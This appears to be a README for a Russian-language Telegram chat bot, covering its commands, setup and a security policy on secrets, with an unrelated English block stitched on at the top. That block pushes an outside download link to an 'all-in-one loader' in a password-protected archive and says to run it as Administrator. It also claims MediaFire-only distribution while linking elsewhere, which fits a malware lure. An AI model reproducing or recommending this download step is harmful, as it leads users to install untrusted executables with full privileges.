<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## ✨ Что умеет

- 🗣 **Общаться:** подхватывать стиль чата, отвечать и иногда писать первой.
- 🧠 **Запоминать:** факты об участниках, события и внутренние шутки.
- 🕰 **Пересказывать:** объяснять, что происходило, пока тебя не было.
- 🖼 **Делать мемы:** карточки-цитаты и демотиваторы из сообщений и фотографий.
- 📊 **Показывать статистику:** кто больше пишет, какие слова в топе и что бот помнит.

## 🎮 Команды

| Команда | Что делает |
| --- | --- |
| `/mhelp` | Все команды в одном месте |
| `/mhis` | «Что я пропустил?» — пересказ переписки |
| `/mstats` | Статистика чата с удобными кнопками |
| `/mprof` | Твоя карточка или профиль участника |
| `/madd` | Добавить факт в профиль участника *(админ)* |
| `/mcit` | Сделать карточку-цитату из сообщения |
| `/mdem` | Сделать демотиватор |
| `/mgen` | Реплика в стиле чата или конкретного участника |
| `/mset` | Настроить самостоятельность и хаос *(админ)* |
| `/mtest` | Проверить, почему бот молчит *(админ)* |
| `/mforget` | Очистить память чата *(админ)* |
| `/mvpn` | Маркевич ВПН |

**Несколько примеров:**

```text
/mhis 150
/mprof @vasya
/madd @vasya любит собачек
/mgen @vasya
```

Для `/mcit` просто ответь командой на нужное сообщение. `/mprof` и `/madd` тоже поддерживают reply; для `/madd` нужны права администратора.

## 🆕 Что нового за последний месяц

За сентябрь–октябрь 2026 Мёмочка заметно подросла:

- **Больше самостоятельности:** переделали ожидание автоответов, чтобы активная переписка не сбрасывала таймер бесконечно.
- **`/mhis`:** пересказ последних сообщений, если пропустил весь движ.
- **`/mprof` и `/madd`:** профили людей и факты, которые можно добавлять вручную.
- **Новый `/mstats`:** аккуратная статистика с разделами и кнопками.
- **Обновлённый `/mhelp`:** простой список команд без лишнего шума.
- **Новый вид `/mcit`:** пиксельные карточки с цитатами.
- **`/mtest`:** диагностика Telegram, базы, OpenRouter и автономности.
- **Улучшенная память:** Мёмочка лучше использует историю и локальные факты чата.

В общем, теперь она не только шутит, но и кое-что о вас знает. 👀

## 🚀 Как запустить у себя

Нужны **Python**, токен Telegram-бота и API-ключ **OpenRouter**.

1. Установи зависимости:

   ```bash
   python -m pip install -r requirements.txt
   ```

2. Скопируй `.env.example` в `.env` и заполни хотя бы `BOT_TOKEN` и `OPENROUTER_API_KEY`.
3. Запусти:

   ```bash
   python main.py
   ```

Чтобы бот видел обычные сообщения в группе, отключи **Privacy Mode** через BotFather. А чтобы он писал сам, включи самостоятельность в `/mset`.

> 🔒 Не загружай `.env`, `bot.db` и логи в публичный репозиторий: там могут быть ключи и данные чатов.

---

<p align="center"><i>Мёмочка — та самая, которая всё помнит, даже когда лучше бы не надо 💜</i></p>


---

# Security Policy

## Secrets

Никогда не публикуйте реальные значения:

- `BOT_TOKEN`
- `OPENROUTER_API_KEY`
- любых будущих API keys / passwords / credentials

Используйте локальный `.env`, который исключён из Git через `.gitignore`.
Для примера настроек в репозитории хранится только `.env.example` без секретов.

## Runtime data

`bot.db` не должен публиковаться: база может содержать сообщения, настройки и накопленную память Telegram-чатов.
Логи также исключены из репозитория.

## If a secret was committed

1. Сразу перевыпустите скомпрометированный токен/ключ у соответствующего провайдера.
2. Удалите секрет из Git-истории, а не только из текущей версии файла.
3. Проверьте репозиторий GitHub Secret Scanning / Push Protection.
